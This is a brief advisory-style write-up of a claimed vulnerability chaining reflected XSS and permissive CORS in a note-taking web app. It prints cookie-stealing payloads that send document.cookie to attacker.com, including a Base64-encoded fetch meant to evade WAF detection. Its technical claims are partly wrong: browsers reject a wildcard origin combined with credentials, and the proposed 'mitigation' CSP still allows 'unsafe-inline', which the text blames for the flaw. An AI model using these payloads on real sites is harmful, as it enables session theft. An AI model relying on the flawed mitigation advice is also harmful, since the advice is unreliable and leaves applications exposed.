CVE-2025-34291 combines overly permissive CORS and XSS in Obsidian’s web application framework (e.g., SaaS note-taking app). The exploit chain begins with identifying a reflected XSS via `?q=<img src=x onerror=fetch('https://attacker.com/steal?c='+document.cookie)>`, bypassing CSP with `unsafe-inline` due to misconfigured `Content-Security-Policy` headers.

The CORS misconfiguration (`Access-Control-Allow-Origin: *`, `Access-Control-Allow-Credentials: true`) allows attackers to exfiltrate cookies via `fetch('/api/v1/notes', {credentials: 'include'})`, even when SameSite=Lax/Strict is enforced. Real-world payloads use JavaScript Base64 encoding to avoid WAF detection:
```javascript
fetch(`https://attacker.com/x`, {
  method: 'POST',
  body: btoa(JSON.stringify({token: document.cookie})),
  headers: {'Content-Type': 'text/plain'}
});
```
Mitigations require hardening CORS (`Access-Control-Allow-Origin: https://legit-domain.com`) and implementing CSP with `Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'`.

